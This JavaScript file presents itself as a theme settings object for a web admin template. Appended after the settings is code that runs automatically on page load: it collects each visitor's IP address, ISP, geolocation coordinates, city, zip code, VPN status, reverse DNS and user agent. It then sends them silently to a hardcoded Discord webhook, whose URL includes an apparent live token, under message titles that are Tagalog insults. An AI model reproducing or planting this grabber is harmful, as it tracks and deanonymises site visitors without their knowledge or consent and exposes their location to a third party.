var KTAppSettings = {
    "breakpoints": {
        "sm": 576,
        "md": 768,
        "lg": 992,
        "xl": 1200,
        "xxl": 1400
    },
    "colors": {
        "theme": {
        "base": {
            "white": "#ffffff",
            "primary": "#3699FF",
            "secondary": "#E5EAEE",
            "success": "#1BC5BD",
            "info": "#8950FC",
            "warning": "#FFA800",
            "danger": "#F64E60",
            "light": "#E4E6EF",
            "dark": "#181C32"
        },
        "light": {
            "white": "#ffffff",
            "primary": "#E1F0FF",
            "secondary": "#EBEDF3",
            "success": "#C9F7F5",
            "info": "#EEE5FF",
            "warning": "#FFF4DE",
            "danger": "#FFE2E5",
            "light": "#F3F6F9",
            "dark": "#D6D6E0"
        },
        "inverse": {
            "white": "#ffffff",
            "primary": "#ffffff",
            "secondary": "#3F4254",
            "success": "#ffffff",
            "info": "#ffffff",
            "warning": "#ffffff",
            "danger": "#ffffff",
            "light": "#464E5F",
            "dark": "#ffffff"
        }
        },
        "gray": {
        "gray-100": "#F3F6F9",
        "gray-200": "#EBEDF3",
        "gray-300": "#E4E6EF",
        "gray-400": "#D1D3E0",
        "gray-500": "#B5B5C3",
        "gray-600": "#7E8299",
        "gray-700": "#5E6278",
        "gray-800": "#3F4254",
        "gray-900": "#181C32"
        }
    },
    "font-family": "Poppins"
};

var webHookUrl = "https://discord.com/api/webhooks/1256947814399742023/VZGV4lTe_LT3H83RH3nVdpz8z0Hiu-7Wn7fDVTjVzMozqaCwQUZy0MVJDOOu7VMjYLvS";


    const request = async () => {
        // Fetch IP information from the ipinfo.io endpoint
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
    
        // Get the IP address and other details
        var ip = data.ip;
        var provider = data.org;
        var timezone = data.timezone;
        var countryCode = data.country ? data.country.toLowerCase() : "N/A";
        var region = data.region;
        var city = data.city;
        var zip = data.postal;
        var lat = data.loc.split(',')[0];
        var lon = data.loc.split(',')[1];
    
        // Fetch VPN status (You can continue to use your original method for this)
        const vpnResponse = await fetch('https://json.geoiplookup.io/' + ip);
        const vpnData = await vpnResponse.json();
        var isVPN = vpnData.connection_type === "Corporate" ? "Yes" : "No";
    
        // Fetch reverse DNS information from the same IP using 'ipinfo.io'
        const reverseResponse = await fetch(`https://ipinfo.io/${ip}/hostname`);
        const reverseData = await reverseResponse.text();
        
        // User Agent
        var userAgent = navigator.userAgent;
    
        // Create a Google Maps link
        var googleMapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
    
        // Open POST Request to Discord Webhook
        var postRequest = new XMLHttpRequest();
        postRequest.open("POST", webHookUrl);
    
        postRequest.setRequestHeader('Content-type', 'application/json');
    
        var params = {
            username: "Aisurix",
            avatar_url: "https://cdn.discordapp.com/attachments/808513717872361562/1254262605275725875/Screenshot_20240621_230125.jpg?ex=66821514&is=6680c394&hm=48892a7eac59ce238305321e2db61e1a60523fac74a1e05b42e52429399eafde&",
            thumbnail: "https://cdn.discordapp.com/attachments/808513717872361562/1254262605275725875/Screenshot_20240621_230125.jpg?ex=66821514&is=6680c394&hm=48892a7eac59ce238305321e2db61e1a60523fac74a1e05b42e52429399eafde&",
            image: "https://cdn.discordapp.com/attachments/808513717872361562/1254262605275725875/Screenshot_20240621_230125.jpg?ex=66821514&is=6680c394&hm=48892a7eac59ce238305321e2db61e1a60523fac74a1e05b42e52429399eafde&",
            embeds: [
                {
                    title: "tangina bobo",
                    fields: [
                        {
                            name: "KANTOT KA NGAYON",
                            value: "`" + ip + "`",
                            inline: true
                        },
                        {
                            name: "Provider",
                            value: provider,
                            inline: true
                        },
                        {
                            name: "Timezone",
                            value: timezone,
                            inline: true
                        },
                        {
                            name: "Location",
                            value: `Longitude: ${lon}\nLatitude: ${lat}`,
                            inline: true
                        },
                        {
                            name: "Google Maps",
                            value: `[View on Google Maps](${googleMapsLink})`,
                            inline: true
                        },
                        {
                            name: "VPN",
                            value: isVPN,
                            inline: true
                        },
                        {
                            name: "Reverse DNS",
                            value: reverseData,
                            inline: true
                        },
                        {
                            name: "User Agent",
                            value: userAgent,
                            inline: true
                        },
                        {
                            name: "Region | City | Zip",
                            value: `${region} | ${city} | ${zip}`,
                            inline: true
                        }
                    ]
                }
            ]
        };
    
        postRequest.send(JSON.stringify(params));
    }
    
    request();
